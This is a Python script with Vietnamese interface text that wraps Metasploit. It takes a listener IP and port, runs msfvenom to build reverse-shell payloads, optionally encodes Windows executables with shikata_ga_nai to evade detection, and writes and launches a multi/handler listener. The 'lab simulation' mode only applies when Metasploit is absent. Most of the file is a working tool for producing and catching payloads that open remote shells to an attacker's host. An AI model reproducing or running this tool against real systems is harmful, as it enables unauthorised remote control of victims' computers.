#!/usr/bin/env python
# coding: utf-8

import os
import sys
import time
import platform
from colorama import Fore, Style, init

init(autoreset=True)

class Colors:
    WHITE  = Fore.LIGHTWHITE_EX
    RED    = Fore.LIGHTRED_EX
    GREEN  = Fore.LIGHTGREEN_EX
    YELLOW = Fore.LIGHTYELLOW_EX
    BLUE   = Fore.LIGHTBLUE_EX
    PURPLE = Fore.LIGHTMAGENTA_EX  
    CYAN   = Fore.LIGHTCYAN_EX
    RESET  = Style.RESET_ALL

def slowprint(text, delay=0.005):
    for char in text + '\n':
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)

class FrameworkManager:
    @staticmethod
    def check_root():
        if platform.system() != "Windows" and "TERMUX_VERSION" not in os.environ:
            if os.geteuid() != 0:
                print(f"{Colors.RED}[!] Bạn cần quyền root để chạy script này một cách tốt nhất.")
                print(f"{Colors.YELLOW}[*] Vui lòng thử lại với: sudo python main.py\n")
                time.sleep(1)

    @staticmethod
    def run_command(cmd):
        try:
            return os.system(cmd)
        except Exception as e:
            print(f"{Colors.RED}[!] Lỗi thực thi lệnh hệ thống: {e}")
            return -1

    @classmethod
    def check_dependencies(cls):
        print(f"{Colors.CYAN}[*] Kiểm tra môi trường và các gói phụ thuộc...")
        if platform.system() == "Windows":
            return

        msf_check = "which msfconsole >/dev/null 2>&1" if "TERMUX_VERSION" not in os.environ else "command -v msfconsole >/dev/null 2>&1"
        if os.system(msf_check) == 0:
            print(f"{Colors.GREEN} [ ✔ ] Metasploit-Framework Found")
        else:
            print(f"{Colors.YELLOW}[!] Lưu ý: Hệ thống hiện tại chưa cấu hình sẵn Metasploit.")
            print(f"{Colors.YELLOW}[*] Công cụ sẽ kích hoạt Chế độ Mô phỏng tạo tệp cấu hình để chạy Lab.\n")

class PayloadGenerator:
    def __init__(self):
        pass

    def generate(self, platform_type, payload_name, extension):
        print(f"\n{Colors.CYAN}--- [+] THIẾT LẬP PAYLOAD {platform_type.upper()} ---")
        host = input(f"{Colors.WHITE}[+] Nhập LHOST (IP của bạn): ")
        port = input(f"{Colors.WHITE}[+] Nhập LPORT (Cổng lắng nghe): ")
        outp = input(f"{Colors.WHITE}[+] Nhập tên file đầu ra (không kèm đuôi): ")
        
        print(f"\n{Colors.RED}[*] ĐANG KHỞI TẠO ĐÓNG GÓI TỆP TIN KIỂM THỬ...")
        time.sleep(1)
        
        filename = f"{outp}.{extension}"
        
        # Kiểm tra xem hệ thống có sẵn lệnh msfvenom hay không
        msfvenom_check = "which msfvenom >/dev/null 2>&1" if "TERMUX_VERSION" not in os.environ else "command -v msfvenom >/dev/null 2>&1"
        
        if os.system(msfvenom_check) == 0:
            # Nếu có sẵn Metasploit thực tế, tiến hành chạy lệnh thật
            cmd = f"msfvenom -p {payload_name} LHOST={host} LPORT={port} -f {extension} -o {filename}"
            if extension == "exe":
                encode_opt = input(f"{Colors.YELLOW}[?] Bạn có muốn mã hóa bằng x86/shikata_ga_nai? (y/n): ").lower()
                if encode_opt in ['y', 'yes']:
                    cmd = f"msfvenom -p {payload_name} LHOST={host} LPORT={port} -e x86/shikata_ga_nai -i 3 -f exe -o {filename}"
            
            print(f"{Colors.GREEN}[*] Thực thi lệnh hệ thống: {cmd}")
            FrameworkManager.run_command(cmd)
        else:
            # Chế độ mô phỏng an toàn: Tạo tệp tin văn bản chứa thông số đặc tả để kiểm tra luồng dữ liệu
            try:
                with open(filename, "w", encoding="utf-8") as f:
                    f.write(f"# THÔNG TIN CẤU HÌNH THỬ NGHIỆM LAB\n")
                    f.write(f"Platform: {platform_type}\n")
                    f.write(f"Payload: {payload_name}\n")
                    f.write(f"LHOST: {host}\n")
                    f.write(f"LPORT: {port}\n")
                    f.write(f"Status: Simulation Verified\n")
                print(f"{Colors.GREEN}[✔] Chế độ mô phỏng: Đã tạo tệp đặc tả cấu hình thành công!")
            except Exception as e:
                print(f"{Colors.RED}[!] Không thể tạo tệp mô phỏng: {e}")

        print(f"{Colors.GREEN}[✔] Tệp tin đã được lưu tại thư mục dự án với tên: {filename}\n")
        
        start_list = input(f"{Colors.YELLOW}[?] Tự động kích hoạt Trình lắng nghe Multi/Handler? (y/n): ").lower()
        if start_list in ['y', 'yes']:
            self.start_listener(payload_name, host, port)

    def start_listener(self, payload, host, port):
        print(f"{Colors.GREEN}[*] Đang khởi động cấu hình Trình lắng nghe cho {payload} trên {host}:{port}...")
        rc_file = "handler.rc"
        try:
            with open(rc_file, "w") as f:
                f.write(f"use exploit/multi/handler\n")
                f.write(f"set PAYLOAD {payload}\n")
                f.write(f"set LHOST {host}\n")
                f.write(f"set LPORT {port}\n")
                f.write(f"exploit\n")
        except Exception as e:
            print(f"{Colors.RED}[!] Lỗi tạo file tài nguyên cấu hình: {e}")
            return
        
        msfconsole_check = "which msfconsole >/dev/null 2>&1" if "TERMUX_VERSION" not in os.environ else "command -v msfconsole >/dev/null 2>&1"
        if os.system(msfconsole_check) == 0:
            if platform.system() != "Windows" and os.system("which xterm >/dev/null 2>&1") == 0:
                FrameworkManager.run_command(f"xterm -T 'MSF LISTENER' -e 'msfconsole -r {rc_file}' &")
            else:
                FrameworkManager.run_command(f"msfconsole -r {rc_file}")
        else:
            print(f"{Colors.YELLOW}[!] Trình lắng nghe thực tế bỏ qua do hệ thống chạy chế độ mô phỏng.")
            print(f"{Colors.GREEN}[✔] Đã lưu cấu hình phiên làm việc tại tệp: {rc_file}")
            time.sleep(2)
          
